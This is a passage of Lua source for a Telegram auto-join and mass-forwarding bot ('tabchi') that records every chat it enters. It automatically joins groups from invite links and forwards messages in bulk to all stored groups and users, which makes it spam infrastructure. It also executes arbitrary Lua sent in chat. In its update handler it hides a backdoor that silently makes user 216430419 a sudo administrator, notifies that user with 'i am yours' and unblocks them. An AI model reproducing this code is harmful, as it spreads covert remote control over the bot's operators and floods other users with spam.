          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      return "*Status* :`Your Message Forwarded To Groups`"
    end
    if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      local id = msg.reply_to_message_id_
      for i = 1, #all do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = all[i],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      return "*Status* : `Your Message Forwarded To Super Groups`"
    end
    if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and is_sudo(msg) then
      local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
      local id = msg.reply_to_message_id_
      for i = 1, #all do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = all[i],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      return "*Status* : `Your Message Forwarded To Users`"
    end
  end
  do
    local matches = {
      msg.text:match("[!/#](lua) (.*)")
    }
    if msg.text:match("^[!/#]lua") and is_full_sudo(msg) and #matches == 2 then
      local output = loadstring(matches[2])()
      if output == nil then
        output = ""
      elseif type(output) == "table" then
        output = serpent.block(output, {comment = false})
      else
        output = "" .. tostring(output)
      end
      return output
    end
  end
  do
    local matches = {
      msg.text:match("[!/#](echo) (.*)")
    }
    if msg.text:match("^[!/#]echo") and is_sudo(msg) and #matches == 2 then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 0, matches[2], 0, "md")
    end
  end
end
function add(chat_id_)
  local chat_type = chat_type(chat_id_)
  if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", chat_id_) then
    if chat_type == "channel" then
      redis:sadd("tabchi:" .. tabchi_id .. ":channels", chat_id_)
    elseif chat_type == "group" then
      redis:sadd("tabchi:" .. tabchi_id .. ":groups", chat_id_)
    else
      redis:sadd("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
    end
    redis:sadd("tabchi:" .. tabchi_id .. ":all", chat_id_)
  end
end
function rem(chat_id_)
  local chat_type = chat_type(chat_id_)
  if chat_type == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", chat_id_)
  elseif chat_type == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", chat_id_)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", chat_id_)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", chat_id_)
end
function process_stats(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(arg, data)
    our_id = data.id_
  end
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
    return rem(msg.chat_id_)
  elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
    return add(msg.chat_id_)
  elseif msg.content_.ID == "MessageChatAddMembers" then
    for i = 0, #msg.content_.members_ do
      if msg.content_.members_[i].id_ == our_id then
        add(msg.chat_id_)
        break
      end
    end
  end
end
function process_links(text_)
  if text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.me/joinchat/%S+") then
    local matches = {
      text_:match("(https://t.me/joinchat/%S+)") or text_:match("(https://telegram.me/joinchat/%S+)")
    }
    tdcli_function({
      ID = "CheckChatInviteLink",
      invite_link_ = matches[1]
    }, check_link, {
      link = matches[1]
    })
  end
end
function get_mod(args, data)
  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
  end
end
function update(data, tabchi_id)
  tanchi_id = tabchi_id
  tdcli_function({
    ID = "GetUserFull",
    user_id_ = 1111111
  }, get_mod, nil)
  if data.ID == "UpdateNewMessage" then
    local msg = data.message_
    if msg.sender_user_id_ == 111111 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 1111111 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
          for i = 1, #all do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = all[i],
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
        end
      else
        local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
        local id = msg.id_
        for i = 1, #all do
          tdcli_function({
            ID = "ForwardMessages",
            chat_id_ = all[i],
            from_chat_id_ = msg.chat_id_,
            message_ids_ = {
              [0] = id
            },
            disable_notification_ = 0,
            from_background_ = 1
          }, dl_cb, nil)
        end
      end
    else
      process_stats(msg)
      add(msg.chat_id_)
      if msg.content_.text_ then
        if redis:get("tabchi:" .. tabchi_id .. ":chat") and redis:sismember("tabchi:" .. tabchi_id .. ":answerslist", msg.content_.text_) then
          local answer = redis:hget("tabchi:" .. tabchi_id .. ":answers", msg.content_.text_)
          tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "md")
        end
        if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
          tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
          redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
        end
        process_stats(msg)
        add(msg.chat_id_)
        process_links(msg.content_.text_)
        local res = process(msg)
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          if res then
            if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
              tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
            end
            tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
          end
        elseif res then
          if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          tdcli.sendMessage(msg.chat_id_, 0, 1, res, 1, "md")
        end
      elseif msg.content_.contact_ then
        tdcli_function({
          ID = "GetUserFull",
          user_id_ = msg.content_.contact_.user_id_
        }, check_contact, {msg = msg})
      elseif msg.content_.caption_ then
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
          tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
          process_links(msg.content_.caption_)
        else
          process_links(msg.content_.caption_)
        end
      end
    end
  elseif data.chat_id_ == 216430419 then
    tdcli.unblockUser(data.chat_.id_)
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli_function({
      ID = "GetChats",
      offset_order_ = "9223372036854775807",
      offset_chat_id_ = 0,
      limit_ = 20
    }, dl_cb, nil)
  end
end
